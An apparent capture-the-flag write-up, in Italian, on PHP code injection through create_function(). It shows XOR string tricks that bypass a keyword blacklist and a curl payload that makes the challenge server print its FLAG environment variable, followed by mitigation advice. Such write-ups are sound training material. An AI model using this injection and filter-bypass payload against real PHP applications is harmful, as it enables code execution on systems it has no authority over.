# PHPisLovePHPisLife — PHP Code Injection via `create_function()`

### 1. La Vulnerabilità (In sintesi)
L'applicazione prende l'input utente non sanificato (`code`) e lo passa a `create_function('', $code)`, che internamente esegue un `eval()`.
Una estesa **blacklist** testuale blocca lettere e funzioni, ma valuta solo il testo grezzo e non la logica. Poiché l'input chiude anticipatamente la dichiarazione di funzione, il codice iniettato viene eseguito immediatamente.

### 2. Exploitation (Pratica)
Non potendo usare direttamente stringhe come `getenv` o `FLAG`, si sfrutta lo **XOR bit a bit** per ricostruirle a runtime:
- `('WUDU^F'^'000000')` diventa `'getenv'`
- `('v|qw'^'0000')` diventa `'FLAG'`

**Payload Finale**:
Chiudendo in anticipo la funzione (`};`), invocando un costrutto non bloccato (`die()`) e calcolando dinamicamente il nome della funzione e il suo parametro, bypassiamo tutti i filtri.
```bash
curl -s -X POST http://phpislove.challs.cyberchallenge.it/ \
  --data-urlencode "code=};die(('WUDU^F'^'000000')(('v|qw')^'0000'));//"
```

### 3. Mitigazione
Non usare **mai** `create_function()` (ora rimossa in PHP 8) o `eval()` su input utente. Utilizzare funzioni anonime native (Closure) o whitelist rigorose.
